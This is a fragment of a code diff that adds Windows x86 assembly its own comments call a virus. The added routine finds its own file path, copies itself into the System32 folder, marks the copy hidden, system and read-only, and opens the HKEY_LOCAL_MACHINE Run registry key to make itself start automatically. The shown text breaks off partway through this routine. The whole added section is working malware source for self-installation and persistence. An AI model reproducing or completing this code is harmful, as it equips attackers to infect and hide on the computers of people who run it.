@@ -25,3 +25,45 @@ extern RegSetValueExA
 import RegSetValueExA Advapi32.dll
 extern RegCloseKey
 import RegCloseKey Advapi32.dll
+
+
+section .code USE32
+..start:
+ 
+    push DWORD 0x00000000
+    call [GetModuleHandleA]
+    mov  [Virus_Handle],eax  ;Get Handle of virus
+ 
+    push 0x0104                ;MAX_PATH
+    push DWORD Virus_Path
+    push DWORD [Virus_Handle]
+    call [GetModuleFileNameA] ;Get path of virus
+ 
+    push 0x0104                   ;MAX_PATH
+    push DWORD Sys_Dir
+    call [GetSystemDirectoryA] ;Find System32
+ 
+    mov  edi,Sys_Dir
+    add  edi,eax
+    mov  esi,Virus_Name
+    cld
+    repe  movsb  ;Append virus name to system32 path
+ 
+    push DWORD 0x00000000
+    push DWORD Sys_Dir
+    push DWORD Virus_Path
+    call [CopyFileA]    ;Copy Virus
+ 
+    push DWORD FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM
+    push DWORD Sys_Dir
+    call [SetFileAttributesA] ;Set virus attributes
+ 
+    push DWORD Key_Handle
+    push DWORD KEY_SET_VALUE
+    push DWORD 0x00000000
+    push DWORD Run
+    push DWORD HKEY_LOCAL_MACHINE
+    call [RegOpenKeyExA]   ;Open Run key
+ 
+    mov  esi,Sys_Dir    ;Calculate size of string and store in ECX
+    xor  ecx,ecx
